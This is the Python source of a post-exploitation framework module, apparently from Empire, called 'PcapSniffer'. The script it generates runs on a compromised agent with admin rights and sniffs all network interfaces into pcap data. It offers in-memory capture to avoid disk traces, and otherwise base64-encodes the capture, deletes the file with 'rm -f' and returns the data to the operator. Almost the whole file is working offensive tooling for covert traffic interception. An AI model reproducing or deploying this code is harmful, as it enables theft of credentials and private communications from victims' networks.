class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'PcapSniffer',

            # list of one or more authors for the module
            'Author': ['@Killswitch_GUI'],

            # more verbose multi-line description of the module
            'Description': 'This module will sniff all interfaces on the target, and write in pcap format.',

            # True if the module needs to run in the background
            'Background': False,

            # File extension to save the file as
            'OutputExtension': "pcap",

            # if the module needs administrative privileges
            'NeedsAdmin': True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ['For full comments and code: https://gist.github.com/killswitch-GUI/314e79581f2619a18d94c81d53e5466f']
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run sniffer on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'IpFilter': {
                'Description'   :   'Set IP to filter on (dst & src).',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'PortFilter': {
                'Description'   :   'Set port to filter on (dst & src).',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'MaxSize': {
                'Description'   :   'Set max file size to save to disk/memory (MB).',
                'Required'      :   True,
                'Value'         :   '1'
            },
            'MaxPackets': {
                'Description'   :   'Set max packets to capture.',
                'Required'      :   True,
                'Value'         :   '100'
            },
            'InMemory': {
                'Description'   :   'Store binary data in memory, never drop to disk (WARNING: set MaxSize).',
                'Required'      :   False,
                'Value'         :   'True'
            },

            'SavePath': {
                'Description'   :   'Path of the  file to save (Not used if InMemory is True.',
                'Required'      :   True,
                'Value'         :   '/tmp/debug.pcap'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        savePath = self.options['SavePath']['Value']
        inMemory = self.options['InMemory']['Value']
        maxPackets = self.options['MaxPackets']['Value']
        maxSize = self.options['MaxSize']['Value']
        portFilter = self.options['PortFilter']['Value']
        ipFilter = self.options['IpFilter']['Value']
        if ipFilter != '0':
            ipFilter = "'" + str(ipFilter) + "'"

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
import socket, time
from datetime import datetime
import struct

def outputPcapPFile(fileName, inMemory=False):
  pcapHeader = struct.pack("@IHHIIII",0xa1b2c3d4,2,4,0,0,0x040000,1)
  if inMemory:
    return pcapHeader
  with open(str(fileName), 'wb+') as f:
    f.write(pcapHeader)


def ouputPcapPacket(fileName, pLen, packet, inMemory=False):
  t0, t1, t2, t3, t4, t5, t6, t7, t8 = time.gmtime()
  tstamp = time.mktime((t0, t1, t2, t3, t4, t5, 0, 0, 0))
  dt = datetime.now()
  mstamp = dt.microsecond
  pcapPacket = struct.pack("@IIII",tstamp,mstamp,pLen,pLen)
  if inMemory:
    return pcapPacket
  with open(str(fileName), 'ab+') as f:
    f.write(pcapPacket)
    f.write(packet)


def parseEthernetHeader(data):
    dst = struct.unpack('!BBBBBB',data[:6])        # destination host address
    src = struct.unpack('!BBBBBB',data[6:12])      # source host address
    nextType = struct.unpack('!H',data[12:14])[0]  # IP? ARP? RARP? etc
    return dst, src, nextType

def parseIpHeader(data):
    ihl = struct.unpack('!B',data[14:15])[0]          # 4 bit version 4 bit ihl
    tos = struct.unpack('!B',data[15:16])[0]          # Type of service
    totalLen = struct.unpack('!H',data[16:18])[0]     # IP header length
    ident = struct.unpack('!H',data[18:20])[0]        # IP ident
    fragFlags = struct.unpack('!H',data[20:22])[0]    # Frag_and_flags
    ttl = struct.unpack('!B',data[22:23])[0]          # Packet Time-to-Live
    proto = struct.unpack('!B',data[23:24])[0]        # Next protocol
    checksum = struct.unpack('!H',data[24:26])[0]     # checksum
    sourceIp = struct.unpack('!I',data[26:30])[0]     # Source IP addr
    destIp = struct.unpack('!I',data[30:34])[0]       # Dest IP addr

    sourceIpStr = parseIpAddr(data[26:30])            # hton ip
    destIpStr = parseIpAddr(data[30:34])              # hton ip
    return proto, sourceIpStr, destIpStr

def parseTcpHeader(data):
  sourcePort = struct.unpack('!H',data[34:36])[0]       # source port (set pointer to end of IP Header)
  destPort = struct.unpack('!H',data[36:38])[0]         # destination port
  sequence = struct.unpack('!I',data[38:42])[0]         # sequence number - 32 bits
  acknowledge = struct.unpack('!I',data[42:46])[0]      # acknowledgement number - 32 bits
  return sourcePort, destPort

def parseUdpHeader(data):
  sourcePort = struct.unpack('!H',data[34:36])[0]       # source port (set pointer to end of IP Header)
  destPort = struct.unpack('!H',data[36:38])[0]         # destination port
  udpLength = struct.unpack('!H',data[38:40])[0]        # Udp packet length
  udpChecksum = struct.unpack('!H',data[40:42])[0]      # Udp checksum (optional)
  return sourcePort, destPort

def parseIcmpHeader(data):
  typeCode = struct.unpack('!H',data[34:36])[0]       # ICMP Error type
  code = struct.unpack('!H',data[36:38])[0]           # Type sub code
  checksum = struct.unpack('!H',data[38:40])[0]       # checksum
  idCode = struct.unpack('!H',data[40:42])[0]         # ICMP ID code
  seq = struct.unpack('!H',data[42:44])[0]            # Seq number

def parseIpAddr(data):
  ipOct = []
  ipOct.append(str(struct.unpack('!B', data[0:1])[0]))  # octet 1
  ipOct.append(str(struct.unpack('!B', data[1:2])[0]))  # octet 2  
  ipOct.append(str(struct.unpack('!B', data[2:3])[0]))  # octet 3
  ipOct.append(str(struct.unpack('!B', data[3:4])[0]))  # octet 4
  ipStr = '.'.join(ipOct)
  return ipStr

def socketSniffer(fileName,ipFilter,portFilter,maxSize, maxPackets, inMemory):
  try:
      s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW ,socket.ntohs(0x0003))
  except socket.error , msg:
    return
  # build pcap file header and output
  memoryPcap = ''
  if inMemory:
    memoryPcap += outputPcapPFile(fileName, inMemory=inMemory)
  else:
    outputPcapPFile(fileName, inMemory=inMemory)
  packetCounter = 0
  sizeCounter = 0
  maxSize = maxSize * 1024 * 1024
  while (packetCounter < maxPackets):
      if (sizeCounter > maxSize):
        break
      packet = s.recvfrom(65565)
      pLen = len(packet[0])
      if (ipFilter or portFilter):
        packetOut = False
        dst, src, nextType = parseEthernetHeader(packet[0])
        if (hex(nextType) == hex(0x800)):
          proto, sourceIpStr, destIpStr = parseIpHeader(packet[0])
          # ICMP (1)
          # TCP  (6)
          # UDP  (17)
          if (proto == 6):
            sourcePort, destPort = parseTcpHeader(packet[0])
            if ipFilter and portFilter:
              if (ipFilter == sourceIpStr or ipFilter == destIpStr) and (portFilter == sourcePort or portFilter == destPort):
                packetOut = True
            elif (ipFilter == sourceIpStr or ipFilter == destIpStr):
              packetOut = True
            elif (portFilter == sourcePort or portFilter == destPort):
              packetOut = True
          elif (proto == 17):
            sourcePort, destPort = parseUdpHeader(packet[0])
            if ipFilter and portFilter:
              if (ipFilter == sourceIpStr or ipFilter == destIpStr) and (portFilter == sourcePort or portFilter == destPort):
                packetOut = True
            elif (ipFilter == sourceIpStr or ipFilter == destIpStr):
              packetOut = True
            elif (portFilter == sourcePort or portFilter == destPort):
              packetOut = True
          else:
            if (ipFilter == sourceIpStr or ipFilter == destIpStr):
              packetOut = True
        if packetOut:
          if inMemory:
            memoryPcap += ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
            memoryPcap += packet[0]
            sizeCounter += pLen
            packetCounter += 1
          else:
            ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
            sizeCounter += pLen
            packetCounter += 1
      else: 
        if inMemory:
            memoryPcap += ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
            memoryPcap += packet[0]
            sizeCounter += pLen
            packetCounter += 1
        else:
            ouputPcapPacket(fileName ,pLen, packet[0], inMemory=inMemory)
            sizeCounter += pLen
            packetCounter += 1
  try:
    if inMemory:
        print memoryPcap
    else:
        f = open('%s', 'rb')
        data = base64.b64encode(f.read())
        f.close()
        run_command('rm -f %s')
        print data
  except Exception as e:
    print e

fileNameSave = '%s'
ipFilter = %s
portFilter = %s
maxSize = %s
maxPackets = %s
inMemory = %s
socketSniffer(fileNameSave,ipFilter,portFilter,maxSize,maxPackets, inMemory)
        """ % (savePath, savePath, savePath, ipFilter, portFilter, maxSize, maxPackets, inMemory)

        return script
